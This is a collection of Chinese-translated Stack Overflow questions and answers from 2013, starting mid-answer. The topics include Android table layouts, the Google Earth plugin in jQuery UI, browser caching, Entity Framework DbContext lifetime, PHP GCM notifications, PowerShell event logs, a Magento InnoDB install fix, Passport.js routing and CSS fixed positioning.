        table.addView(row);
    }
} 
```

图片在哪里：

*   `R.drawable.cell`： ![](../Images/924e30f2961343820d80d04873a62285.png)

*   `R.drawable.extra`（一个视觉透明的可绘制对象，复制了上面的九个补丁）： ![](../Images/e20823391cff7626adb5ca5d834fb148.png)

*   `R.drawable.normalrow`： ![](../Images/985c2e79aac5ab95054935b5e4721eb9.png)

*   `R.drawable.firstrow`： ![](../Images/1203f6693af49a07b025bc0dd19745f1.png)

忽略我的设计技巧。

如果您预见到大量行，我建议您使用 a `ListView`，您可以很容易地使它看起来像一个带边框的表格。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-18T16:26:46.227

无法确定垂直线，但你可以建立一些东西

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    ScrollView sv = new ScrollView(this);

    TableLayout ll=new TableLayout(this);
    HorizontalScrollView hsv = new HorizontalScrollView(this);

    for(int i=1;i<5;i++) {
        TableRow tbrow=new TableRow(this);

        for(int j=1;j<=3;j++) {
            TextView tv1=new TextView(this);
            tv1.setText("Element :"+ i + "" + j);
            tbrow.addView(tv1);                
        }
        ll.addView(tbrow);
        View v = new View(this);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, 5);
        v.setLayoutParams(params);
        v.setBackgroundColor(getResources().getColor(android.R.color.white));
        ll.addView(v);
    }
    hsv.addView(ll);
    sv.addView(hsv);
    setContentView(sv);
} 
```

# javascript - Google 地球插件在 jquery-ui 对话框中出现内部错误 (1.10.2)

> ID：15443421
> 
> 赞同：0
> 
> 时间：2013-03-15T22:59:05.480
> 
> 标签：javascript, jquery, jquery-ui, google-earth, google-earth-plugin

我在 jquery-ui 对话框中弹出 google earth 插件。这适用于 jquery-ui 1.9.2，但在升级到 1.10.2 后，插件会加载，但在尝试移动对话框时，谷歌地球停止使用“谷歌地球插件出现内部错误。请尝试重新加载页面。”

Win7 和 OSX 10.8.2 都会出现这种情况，Chrome 和 Safari 也会出现这种情况。还有其他人遇到这个问题吗？解决方法？

这是下面代码的[jsfiddle](http://jsfiddle.net/murdog/sysPX/10/)，如果您将 jquery-ui 降级到 1.9.2 一切正常：

```
<!DOCTYPE HTML>
<html>
    <script type="text/javascript" src="//www.google.com/jsapi"></script>

    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>

    <script src="//ajax.googleapis.com/ajax/libs/jqueryui/1.10.2/jquery-ui.min.js"></script>
    <link type="text/css" href="//ajax.googleapis.com/ajax/libs/jqueryui/1.10.2/themes/smoothness/jquery-ui.css" rel="stylesheet" />
<script>

var loaded = false;

function loadGE() {
    google.load('earth', '1', {
        callback: function () {
            google.earth.createInstance('editmap3d', function (instance) {
                initEditGE(instance);
            }, function () {
                failureGE();
            });
        }
    });
}

function initEditGE(instance) {
    loaded = true;
    ge = instance;

    var lookAt = ge.createLookAt('');
    lookAt.setLatitude(36.584207);
    lookAt.setLongitude(-121.754322);
    lookAt.setRange(5000.0); //default is 0.0

    ge.getView().setAbstractView(lookAt);
    ge.getWindow().setVisibility(true);
    ge.getNavigationControl().setVisibility(ge.VISIBILITY_SHOW);
}

function failureGE() {
    console.log("GE failed to load...");
}

$(document).ready(function () {
    $("#opendialog").button().click(function () {
        $("#editDialog").dialog("open");

        if (!loaded) loadGE();
    });

    $("#editDialog").dialog({
        autoOpen: false,
        height: 500,
        width: 500,
        modal: true,
        resizable: false
    });
})

</script>

<body>
    <div>GE in popup</div>
    <button id="opendialog">open</button>
    <div id="editDialog">
        <div id="mapcontainer" style="width:600; height:600;">
            <div id="editmap3d" style="height:100%;"></div>
        </div>

    </div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-25T17:53:34.910

我实际上观察到与 1.10.1 类似的情况，插件加载然后崩溃。我确实注意到它在非缩小版本中运行良好，但在 1.10.1 的缩小版本中崩溃。

编辑：我的问题不是 jquery-ui，而是 jquery 和谷歌地球。使用 UI 1.10.3，无论是 min 还是 min 似乎都可以正常工作。

# .net - VS2010 ASP.NET MVC 应用程序中的错误？

> ID：15443422
> 
> 赞同：3
> 
> 时间：2013-03-15T22:59:10.053
> 
> 标签：.net, asp.net-mvc, asp.net-mvc-3, visual-studio-2010

我创建了一个 JavaScript 文件以在我的 ASP.NET MVC3 应用程序中使用，它工作正常，直到我对其进行了更改。现在我的应用程序正在使用我以前不存在的 JavaScript 代码！！！我关闭了VS再打开，我删除了文件并重新创建了它，我已经删除了标签并重新设置了它，我什至关闭了我的计算机并再次打开它，我不知道还有什么去做。如果我输入以下代码，这真的很奇怪：

```
<script type="text/javascript" src="myScript.js"></script> 
```

我可以使用我以前`myScript.js`不存在的版本，不仅在它正在寻找它的地方，而且在我的硬盘驱动器中！这是不希望的 VS 缓存还是浏览器（Google Chrome 23.0.1271.97）？这是一个错误吗？请问怎么解决这个问题，我要疯了！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T19:07:27.570

每当您更改 JavaScript 时，您都可以按 ctrl + f5 .. 它强制浏览器从服务器获取新文件

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-18T05:09:37.863

阿曼是正确的：

```
CTRL + F5  --> is requesting a new copy as if there is no caching. 
```

旁注，常规 F5 强制检查，因此如果路径中的服务器同意检查缓存版本

用于查看正在发生的事情的好工具

```
Firebug
Fiddler 2 
```

话虽如此，我已经看到 IE 即使使用 CTRL + F5 也会保留缓存，我使用 F12 开发人员工具并以这种方式清除项目，而不是关闭浏览器。处理起来可能会令人沮丧。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-18T09:02:32.577

首先使用 ctrl+f5 清除浏览器的缓存。它将更新信息。如果您在后端进行了一些更改，您将需要重复此操作，否则您将遇到同样的问题......

# wpf - WPF 应用程序中短暂的 DbContext 合理吗？

> ID：15443424
> 
> 赞同：4
> 
> 时间：2013-03-15T22:59:24.487
> 
> 标签：wpf, entity-framework, dbcontext, dbset

在他关于 DbContext 的书中，@RowanMiller 展示了如何使用 DbSet.Local 属性来避免 1.) 不必要的数据库往返和 2.) 在应用程序中传递集合（使用例如 ToList() 创建）（第 24 页）。然后我尝试遵循这种方法。但是，我注意到从一个使用 [} – 块到另一个， DbSet.Local 属性变为空：

```
ObservableCollection<Destination> destinationsList;

using (var context = new BAContext())
{ 
   var query = from d in context.Destinations …;
   query.Load();
   destinationsList = context.Destinations.Local; //Nonzero here.
}
//Do stuff with destinationsList

using (var context = new BAContext())
{ 
   //context.Destinations.Local zero here again;
   //So no way of getting the in-memory data from the previous using- block here?
   //Do I have to do another roundtrip to the database here to get the same data I wanted
   //to cache locally???
} 
```

那么，第 24 页的重点是什么？如果 DbSet.Local 只能在 using- 块内使用，我如何避免传递我的集合？此外，如果我使用这些短暂的上下文实例而不在后台将任何缓存数据移交给彼此，我如何从更改跟踪中受益？那么，如果上下文应该是短暂的以释放连接等资源，我是否应该为此放弃缓存？即我不能同时使用两者（短期连接但长期缓存）？所以我唯一的选择是将查询返回的结果存储在我自己的变量中，这正是第 24 页的动机中不鼓励的？

我正在开发一个 WPF 应用程序，它可能在未来也会变得多层，涉及 WCF。我知道 Julia 在她的书中有一个这样的例子，但我目前无法访问它。我在网上找到了其他几个，例如[http://msdn.microsoft.com/en-us/magazine/cc700340.aspx](http://msdn.microsoft.com/en-us/magazine/cc700340.aspx)（旧的 ObjectContext，但很好地解释了层间协作）。在那里，使用了一个长寿命的上下文（虽然提到了缺点，但没有提供这些缺点的解决方案）。不仅单个 Destinations.Local 会丢失，因为您肯定知道查询获取的所有其他实体也是如此。

[编辑]：在阅读了 Julia Lerman 的书之后，似乎可以归结为 EF 默认没有二级缓存；但是，通过一些（我认为是相当大的）努力，可以添加第 3 方缓存解决方案，正如本书和 MSDN、codeproject 等的各种文章中所描述的那样。

如果在 DbContext 书中关于 DbSet.Local 的部分中提到了这个问题，我将不胜感激，因为它实际上是一级缓存，在 using {} 块结束时被销毁（只是我的建议，使其对读者）。在第一次阅读之后，我的印象是 DbSet.Local 总是会在第二个 using {} 块中返回相同的引用（单例样式），尽管有新的 DbContext 实例。

但我仍然不确定二级缓存是否适合我的 WPF 应用程序（正如 Julia 在她的分布式应用程序文章中提到的二级缓存）？或者是通过 using {} 块中的一个或一些查询将我的域模型的聚合根实例（DDD，Eric Evans）放入内存的方法，处理 DbContext 并只保存对聚合实例的引用，这个避免长期存在的上下文？如果您能帮助我做出这个决定，那就太好了。

[http://msdn.microsoft.com/en-us/magazine/hh394143.aspx](http://msdn.microsoft.com/en-us/magazine/hh394143.aspx) [http://www.codeproject.com/Articles/435142/Entity-Framework-Second-Level-Caching-with-DbConte](http://www.codeproject.com/Articles/435142/Entity-Framework-Second-Level-Caching-with-DbConte) [http:// blog.3d-logic.com/2012/03/31/using-tracing-and-caching-provider-wrappers-with-codefirst/](http://blog.3d-logic.com/2012/03/31/using-tracing-and-caching-provider-wrappers-with-codefirst/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-08-07T14:53:08.527

该[`Local`属性](https://docs.microsoft.com/en-us/dotnet/api/system.data.entity.dbset.local?view=entity-framework-6.2.0)提供“此集中所有已添加、未更改和已修改实体的本地视图”。与所有更改跟踪一样，它特定于您当前使用的上下文。

DB Context 是一个用于加载数据和准备更改的工作区。

如果两个用户同时添加更改，他们必须在保存之前不知道其他更改。他们可能会丢弃他们准备好的更改，这会突然给其他其他用户带来问题。

数据库上下文确实应该是短暂的，但在必要时可能比超短更长。另请考虑，如果您不加载和丢弃数据而只添加您将保存的更改，则可能无法通过保持资源短暂来节省资源。但这不仅与资源有关，还与 DB 状态可能会发生变化有关，而 DB 上下文仍处于活动状态并已加载数据；这对于更长寿的环境可能很重要。

如果您还不知道要立即保存到数据库中的所有相关更改，那么我建议您不要使用 DB 上下文将更改存储在内存中，而是存储在代码中的数据结构中。

您当然可以在没有活动数据库上下文的情况下使用实体对象来执行此操作。如果您没有另一个合适的数据类并且不想创建一个，或者决定准备其中的更改更有意义，那么这是有道理的。然后，您可以使用[`DbSet.Attach`](https://docs.microsoft.com/en-us/dotnet/api/system.data.entity.dbset.attach?view=entity-framework-6.2.0)将实体附加到数据库上下文，以便在您准备好时保存更改。

# php - php代码向所有设备GCM发送通知

> ID：15443427
> 
> 赞同：0
> 
> 时间：2013-03-15T22:59:33.020
> 
> 标签：php

我需要一点帮助才能一次向所有设备发送通知。我知道需要使用数组，但无法理解。一点提示也可以

```
DB table design
id    gcm_regid   name  email   created_at 
```

目前我必须为所有设备填写表格并一一发送通知。

PHP代码：

```
 <html>
   <head>
    <title></title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js">    </script>
    <script type="text/javascript">
        $(document).ready(function(){

        });
        function sendPushNotification(id){
            var data = $('form#'+id).serialize();
            $('form#'+id).unbind('submit');
            $.ajax({
                url: "send_message.php",
                type: 'GET',
                data: data,
                beforeSend: function() {

                },
                success: function(data, textStatus, xhr) {
                      $('.txt_message').val("");
                },
                error: function(xhr, textStatus, errorThrown) {

                }
            });
            return false;
        }
    </script>
</head>
<body>
    <?php
    include_once 'db_functions.php';
    $db = new DB_Functions();
    $users = $db->getAllUsers();
    if ($users != false)
        $no_of_users = mysql_num_rows($users);
    else
        $no_of_users = 0;
    ?>
    <div class="container">
        <h1>No of Devices Registered: <?php echo $no_of_users; ?></h1>
        <hr/>
        <ul class="devices">
            <?php
            if ($no_of_users > 0) {
                ?>
                <?php
                while ($row = mysql_fetch_array($users)) {
                    ?>
                    <li>
                        <form id="<?php echo $row["id"] ?>" name="" method="post" onsubmit="return sendPushNotification('<?php echo $row["id"] ?>')">
                            <label>Name: </label> <span><?php echo $row["name"] ?></span>
                            <div class="clear"></div>
                            <label>Email:</label> <span><?php echo $row["email"] ?></span>
                            <div class="clear"></div>
                            <div class="send_container">
                                <textarea rows="3" name="message" cols="25" class="txt_message" placeholder="Type message here"></textarea>
                                <input type="hidden" name="regId" value="<?php echo $row["gcm_regid"] ?>"/>
                                <input type="submit" class="send_btn" value="Send" onclick=""/>
                            </div>
                        </form>
                    </li>
                <?php }
            } else { ?>
                <li>
                    No Users Registered Yet!
                </li>
            <?php } ?>
        </ul>
    </div>
</body> 
```

send_message.php

```
 <?php
 if (isset($_GET["regId"]) && isset($_GET["message"])) {
$regId = $_GET["regId"];
$message = $_GET["message"];

include_once './GCM.php';

$gcm = new GCM();

$registatoin_ids = array($regId);
$message = array("price" => $message);

$result = $gcm->send_notification($registatoin_ids, $message);

echo $result;
}
?> 
```

编辑：或者谁能告诉我如何使用复选框来选择所有“id”？

# redirect - 创建更改密码页面

> ID：15443432
> 
> 赞同：-2
> 
> 时间：2013-03-15T22:59:43.870
> 
> 标签：redirect, login, passwords, wordpress

我添加了一个名为“强制密码”的插件，它将强制会员在首次登录时更改密码。

但是，因为我将用户重定向到我自己完成的个人资料页面，所以我不希望他们被重定向到仪表板或能够编辑我的个人资料页面。

相反，我希望弹出一个带有“更改我的密码”框或更改密码框的屏幕，该框将加载到与登录页面类似的页面上。在他们更改密码后，他们将登录到他们的个人资料。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:06:33.010

我不确定您的问题是什么，但您需要做的是挂钩到请求开始时运行的 wp init 操作。在那里您可以检查密码是否已更改，提交表单，检查帖子值并进行重定向。

重定向必须在 Wordpress 开始写入响应之前在 init 中完成。

# powershell - Powershell Get-Eventlog 按时间过滤

> ID：15443434
> 
> 赞同：4
> 
> 时间：2013-03-15T22:59:53.350
> 
> 标签：powershell

我正在运行 Windows 2003，我想在特定时间获取事件列表......在 12:06 pm 之后。那时我怎样才能只获得那些事件？我试过这个：

```
powershell get-eventlog application -after "3/15/2013 12:06:00 pm" 
```

但我收到一个错误：

```
Cannot bind parameter 'InstanceId.... 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-15T23:05:23.307

这有效：

```
 powershell -command  "get-eventlog application -after ([datetime]'3/15/2013 12:06:00 pm')" 
```

# java - 在应用程序范围之外生成“事件范围”bean

> ID：15443435
> 
> 赞同：0
> 
> 时间：2013-03-15T22:59:59.007
> 
> 标签：java, jakarta-ee, jpa, cdi, ejb-3.1

我是 CDI 和 EJB 的新手，我刚刚创建了一个 jboss Web 应用程序。不过，另外，我还希望这个应用程序能够处理 rabbitmq 消息。但是，在处理这些时，我想做一些持久性工作，因为我一直在侦听来自以 @Startup 注释启动的应用程序范围 bean 的 rabbitmq 消息，因此我无法在此提交任何事务一种作用域，也就是说，当我离开应用程序作用域时，我将从这个作用域实例化的每个 bean 都将是应用程序作用域。当我尝试执行 em.getTransaction() 和 em.commit() 时，代码会爆炸，抱怨我无法在 JTA 事务下调用 getTransaction()，当我使用用户事务时，每个操作似乎都放在同一个事务上，直到终于回滚了

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T17:26:20.450

CDI bean 不像 EJB 那样支持开箱即用的事务。所以你的选择是：

1.  在接收到 RabbitMQ 消息后，调用一些 EJB（直接或通过观察者）来完成持久性工作。
2.  使用以下之一将事务支持添加到您现有的 CDI bean - [Apache DeltaSpike](http://incubator.apache.org/deltaspike/)或[Seam Persistence](http://www.seamframework.org/Seam3/PersistenceModule)。

根据您提供的信息，确实很难为您提供更多详细信息。但是，在概念层面上，上述方法之一可以解决问题。

此外， 的概念`event scope`似乎令人困惑。我会说你不需要它。上述方法之一就可以了。另外，请查看[CDI 事件](http://docs.oracle.com/javaee/6/tutorial/doc/gkhic.html)。

# php - PHP - 为什么这个变量在这个 foreach 循环中不起作用？

> ID：15443436
> 
> 赞同：0
> 
> 时间：2013-03-15T22:59:58.713
> 
> 标签：php, foreach

$value 打印正确。这些数字对于 $value 是正确的，所以我认为该部分已被消除。

`($value)->price`如果我在like中手动输入实际数字`(10079)->price`，则该功能可以正常工作，最后一行`print_r ($price)`会打印出它应该输入的数字。

由于某种原因，$value`$xml_price = $fetch_app->products($value)->price;`在函数返回 nil的上下文中不起作用`$price`

```
foreach ($_SESSION['queueList'] as $value){
            //this prints the correct item(s) in 'queueList'
            print_r ($value);
            //this gets the node with the price info
            $xml_price = $fetch_app->products($value)->price;
            //this converts the simpleXML node to a string
            $price = ((string) $xml_price);
            //session var accumulates the item prices in cart
            $_SESSION['totalPrice'] += $price;
            print_r ($price);

        } 
```

那么为什么`$value`变量不起作用，但实际数字却起作用，即使我已经打印了`$value`它并且它显示了正确的数字？顺便说一下，这个数字是一个浮点数，不确定这是否重要。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:12:08.930

从评论中的附加信息来看，以下应该有效：

```
$xml_price = $fetch_app->products((int)$value)->price; 
```

看起来这个 fetchapp API 是强类型的，这对于 PHP 来说是非典型的，但在一定程度上在技术上仍然是可行的。至少它对待字符串参数不同于整数参数。

# android - 如何根据按钮点击隐藏和显示视图？

> ID：15443446
> 
> 赞同：0
> 
> 时间：2013-03-15T23:01:35.203
> 
> 标签：android, android-view

我有一个`Activity`使用以下布局：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/LinearLayout1"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    tools:context=".MainActivity" >

    <Button
        android:id="@+id/btnCapture"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Start capture" />

    <Button
        android:id="@+id/btnPlay"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Play video" />

    <SurfaceView
        android:id="@+id/surfaceView"
        android:layout_width="match_parent"
        android:layout_height="match_parent" />

    <VideoView
        android:id="@+id/videoView"
        android:layout_width="match_parent"
        android:layout_height="match_parent" />    

</LinearLayout> 
```

单击时如何隐藏`surfaceView`和显示？我也想做类似的事情，其中​​隐藏并在单击时显示。`videoView``btnPlay``videoView``surfaceView``btnCapture`

这就是我隐藏和显示视图的方式：

```
surfaceView.setVisibility(View.GONE);

videoView.setVisibility(View.VISIBLE); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-23T15:24:49.580

最简单的方法是将surfaceView和videoView都放在不同的Linearlayout中，然后在btnCapture点击后用linearlayout setVisibility() 进行播放。

也许是这样的：

```
btnPlay.setOnClickListener(new View.OnClickListener() {

@Override
public void onClick(View v) { 
if (surfaceView_linearlayout.getVisibility() == 0) {
    videoView_linearlayout.setVisibility(View.VISIBLE);
    surfaceView_linearlayout.setVisibility(View.GONE);
} 

}
});

btnCapture.setOnClickListener(new View.OnClickListener() {

@Override
public void onClick(View v) { 
if (videoView_linearlayout.getVisibility() == 0) {
    surfaceView_linearlayout.setVisibility(View.VISIBLE);
    videoView_linearlayout.setVisibility(View.GONE);
    }

}
}); 
```

# php - Magento install 在可用时抱怨缺少 InnoDB

> ID：15443448
> 
> 赞同：41
> 
> 时间：2013-03-15T23:01:37.920
> 
> 标签：php, mysql, magento, innodb

在安装过程中，Magento 会产生以下错误：

> 数据库服务器不支持 InnoDB 存储引擎。

我已经修复了 Magento 的所有依赖项，并使用 SHOW ENGINES 在命令行上仔细检查了 MySQL，并且肯定有 InnoDB 可用（也是默认存储引擎）。

这不是其他人可能在安装时看到的访问 MySQL 配置的问题。

注意：这是在 Mac Pro 上运行的（对我正在开发的域名进行简单的主机 DNS 重写）。

* * *

## 回答 #1

> 赞同：133
> 
> 时间：2013-03-15T23:10:16.437

文件第 59 行`app/code/core/Mage/Install/Model/Installer/Db/Mysql4.php`

代替：

```
public function supportEngine()
{
    $variables  = $this->_getConnection()
        ->fetchPairs('SHOW VARIABLES');
    return (!isset($variables['have_innodb']) || $variables['have_innodb'] != 'YES') ? false : true;
} 
```

有了这个：

```
public function supportEngine()
{
    $variables  = $this->_getConnection()
        ->fetchPairs('SHOW ENGINES');
    return (isset($variables['InnoDB']) && $variables['InnoDB'] != 'NO');
} 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2013-06-01T07:02:25.080

或者不要进行核心破解！您应该在安装之前轻轻地覆盖 Installer-Model：

将此粘贴到您的`app/code/local/Company/InstallBugfix/etc/config.xml`：

```
<?xml version="1.0"?>
<config>
    <modules>
        <Company_InstallBugfix>
            <version>0.1.0</version>
        </Company_InstallBugfix>
    </modules>
    <global>
        <models>
            <installbugfix>
                <class>Company_InstallBugfix_Model</class>
            </installbugfix>
            <install>
                <rewrite>
                    <installer_db_mysql4>Company_InstallBugfix_Model_Installer_Db_Mysql4</installer_db_mysql4>
                </rewrite>
            </install>
        </models>
    </global>
</config> 
```

并遵循`app/code/local/Company/InstallBugfix/Model/Installer/Db/Mysql4.php`：

```
<?php
class Company_InstallBugfix_Model_Installer_Db_Mysql4 extends Mage_Install_Model_Installer_Db_Mysql4
{
    /**
     * Check InnoDB support
     *
     * @return bool
     */
    public function supportEngine()
    {
        $supportsEngine = parent::supportEngine();
        if ($supportsEngine) {
            return true;
        }
        $variables = $this
                     ->_getConnection()
                     ->fetchPairs('SHOW ENGINES');
        return (isset($variables['InnoDB']) && $variables['InnoDB'] != 'NO');
    }
} 
```

并启用扩展。优点是，如果 mysql-version 较旧，旧验证仍然正确。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2017-07-26T00:29:24.050

# 1.9.1.0 版下载器.php

为使用`downloader.php`当前捆绑在`1.9.1.0`安装程序中的任何人提供此功能。

如果您很高兴您的 MySQL 数据库在以后的版本中支持 InnoDB（这是默认设置）。您可以安全地编辑文件以删除检查并进行所有下载。

```
 /**
     * Check availabe InnoDB on database.
     *
     * @return Magento_Downloader_Validator
     */
    protected function _checkDbInnoDb()
    {
        if (!$this->_connection) {
            return $this;
        }
        $this->addMessage('Database server supports InnoDB storage engine');
        return $this;
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-30T06:19:42.087

错误已在 Magento CE 1.8 中修复，因此只需将上面的行用于 CE \leq 1.7

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2015-04-29T13:14:23.750

```
public function supportEngine()
{
    $variables  = $this->_getConnection()->fetchPairs('SHOW ENGINES');
    return (isset($variables['InnoDB']) && $variables['InnoDB'] != 'NO');
} 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2015-06-06T06:55:32.087

文件 app/code/core/Mage/Install/Model/Installer/Db/Mysql4.php 的第 59 行

代替：

```
public function supportEngine()
 {
    $variables  = $this->_getConnection()
        ->fetchPairs('SHOW VARIABLES');
    return (!isset($variables['have_innodb']) || $variables['have_innodb'] != 'YES') ? false : true;
} 
```

有了这个：

```
public function supportEngine()
{
 /*   
     $variables  = $this->_getConnection()
        ->fetchPairs('SHOW ENGINES');
     return (!isset($variables['have_innodb']) || $variables['have_innodb'] != 'YES') ? false : true; 
*/
    return 1;
} 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2016-05-30T20:43:43.937

我遇到了同样的问题，唯一有效的方法是当我将文件*app/code/core/Mage/Install/Model/Installer/Db/Mysql4.php*的第 59 行更改为：

```
public function supportEngine()
{
    $variables  = $this->_getConnection()
        ->fetchPairs('SHOW VARIABLES');
    return (!isset($variables['have_innodb']) || $variables['have_innodb'] != 'YES') ? false : true;
} 
```

和：

```
public function supportEngine()
    {
        $variables  = $this->_getConnection()
            ->fetchPairs('SHOW ENGINES');
        return (isset($variables['InnoDB']) && $variables['InnoDB'] != 'YES');
    } 
```

而且我在任何地方都没有找到它，所以如果您遇到困难，我保证这会解决它。

# lucene.net - 是否有 .NET 的 KStem 端口？

> ID：15443449
> 
> 赞同：0
> 
> 时间：2013-03-15T23:02:22.657
> 
> 标签：lucene.net, stemming

我即将启动 Lucene.NET 实现，我担心使用`PorterStemFilter`. 在这里阅读并阅读源代码，对于我的需求来说，这似乎太激进了。

我需要一些更简单的东西，它不寻找根，而只是删除“er”、“ed”、“s”等后缀。根据我的阅读，KStem 可以解决问题。

我一辈子都找不到 .NET 版本的 KStem。我什至找不到用于处理移植的 Java 版本的源代码。

有人能指出我正确的方向吗？

看起来很容易通过简单地删除我不想要的步骤来手工制作一个简化的 PorterStemmer。有人成功了吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-04T12:30:40.017

您可以使用[HunspellStemmer](https://github.com/apache/lucene.net/tree/trunk/src/contrib/Analyzers/Hunspell)，它是 contrib 的一部分。它可以使用免费提供的 hunspell 字典来提供适当的词干。

# node.js - Passport 的路由文件问题

> ID：15443450
> 
> 赞同：2
> 
> 时间：2013-03-15T23:02:33.920
> 
> 标签：node.js, authentication, express, routes, passport.js

我正在使用 NodeJS、Express 和 PassportJS 构建 Web 应用程序。我的一条路线有问题，我无法理解。当我有：

```
...
app.get('/auth/facebook', passport.authenticate('facebook'));
... 
```

一切似乎都很好。但是当我将其更改为：

```
...
app.get('/auth/facebook',
  function(req, res) {
    passport.authenticate('facebook');
  });
... 
```

挂了？我在 app.get 功能上遗漏了什么吗？我希望能够做到这一点，因为我想让路径更加动态，我可以在其中确定什么护照进行身份验证。例如：

```
...
app.get('/auth/:provider',
  function(req, res) {
    passport.authenticate(req.params.provider);
  });
... 
```

提供者可能是`facebook`, `twitter`, 或`google`...

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-16T08:10:49.200

passport.authenticate 是中间件，看一下源码：[https ://github.com/jaredhanson/passport/blob/master/lib/passport/middleware/authenticate.js](https://github.com/jaredhanson/passport/blob/master/lib/passport/middleware/authenticate.js)

passport.authenticate('facebook') 返回一个函数，该函数从 express 获取 req、res、next 参数并处理它们。

所以：

```
app.get('/auth/:provider',
  function(req, res, next) {
    passport.authenticate(req.params.provider)(req, res, next);
  }); 
```

是你需要的。

# css - 允许 Fixed DIV 继续水平移动

> ID：15443451
> 
> 赞同：2
> 
> 时间：2013-03-15T23:02:36.617
> 
> 标签：css, html, fixed, frames

小提琴：http: [//jsfiddle.net/EzuTT/](http://jsfiddle.net/EzuTT/)

CSS

```
#bottomfadebar {
    position:fixed;
    z-index: 2; 
    bottom: 0px;
    width:267px;
    height:84px;
    background-color:#666;
}
#content{
    width:2000px;
    background-color:#ccc;
} 
```

HTML

```
<div id="content">
    This is all of the data. Theres lots of it.  so the user will have to scroll horizontally.  the bottom bar should go out of view as you scroll further to the right because there's so much data.  the bottom bar should only stay "fixed" to the bottom, not to the left hand corner.
</div>

<div id="bottomfadebar">
    THIS SHOULD SCROLL HORIZONALLY AS THE PAGE DOES
</div> 
```

最终，当您向右滚动以查看更多内容 div 时，#bottomfadebar div 继续停留在左下角。我试图弄清楚如何让bottomfadebar DIV滚动到屏幕的左侧，但仍然像当前一样固定在窗口的底部。

- - - 编辑！！！

好的，所以我对此有点吹毛求疵，因为我认为这很容易解释，但后来我意识到绝对因素会出现。它实际上应该位于居中的 NAV div 内。

[http://jsfiddle.net/u5GuG/4/](http://jsfiddle.net/u5GuG/4/)

它确实需要坚持“容器”区域内的绝对左侧：0....我应该指定，我很抱歉。不知道该怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:09:00.927

如果你不介意的话，我会使用一点 jQuery ;)

```
$(window).scroll(function() {
    $("#bottomfadebar").css("left", (-1 * $(window).scrollLeft()) + "px");
}); 
```

小提琴：http: [//jsfiddle.net/inti/Gqpmf/](http://jsfiddle.net/inti/Gqpmf/)

**更新：**现在我想我明白了，您希望在`#bottomfadebar`滚动页面时沿屏幕底部滚动。

```
$(window).scroll(function() {
    var window_width = $(window).width(),
        window_scrollleft = $(window).scrollLeft(),
        content_width = $("#content").width(),
        bottomfadebar_width = $("#bottomfadebar").width(),

        content_path = content_width - window_width,
        bottomfadebar_path = window_width - bottomfadebar_width,
        bottomfadebar_left = 0;

//  Equations:
//  content_pos = window_scrollleft / content_path;
//  bottomfadebar_pos = bottomfadebar_left / bottomfadebar_path;
//  content_pos = bottomfadebar_pos;

    bottomfadebar_left = window_scrollleft / content_path * bottomfadebar_path;

    $("#bottomfadebar").css("left", bottomfadebar_left + "px");
}); 
```

小提琴：http: [//jsfiddle.net/inti/Gqpmf/2/](http://jsfiddle.net/inti/Gqpmf/2/)

**更新 2：**我想我还是不明白，但如果你想让它坚持`[bottom,center]`屏幕位置，那么这个 css 就可以了：

```
#object {
    position: fixed;
    bottom: 0;
    left: 50%;
    width: 200px;
    margin-left: -100px; /* half of the width in negative */
} 
```

小提琴：http: [//jsfiddle.net/inti/Gqpmf/3/](http://jsfiddle.net/inti/Gqpmf/3/)

**更新 3：**真的是我最后的猜测。如果您希望一个项目绝对定位在另一个元素内并相对于它，您必须将容器元素的位置设置为相对（或绝对）。

```
#container {
    position: realtive;
}
#object { /* inside #container */
    position: absolute;
    left: 0; /* will stick to the left side of #container */
    bottom: 0; /* will stick to the bottom side of #container */
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:19:27.940

只需将bottomfadebar 位置切换到“绝对”即可。由于您已经设置了 'bottom:0' ，因此它将粘在页面底部。当您水平滚动时它不会保持可见，因为绝对定位的元素将默认为“left：0”，除非您另有指定（除非在旧版本的 IE（我认为是 7 及以下）中您可能需要声明“left：0” ;' 避免奇怪的渲染。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T23:28:11.977

不要使用固定定位，而是使用 absolute 并将 left 和 bottom 属性设置为 0。这会将 div 定位在页面的左下角，而不是浏览器视口的左下角。

```
#bottomfadebar {
position:absolute;
z-index: 2; 
left: 0;
bottom: 0;
width:267px;
height:84px;
    background-color:#666;
} 
```

小提琴在这里：http: [//jsfiddle.net/u5GuG/3/](http://jsfiddle.net/u5GuG/3/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T23:07:04.893

我修改了你的小提琴中的代码。

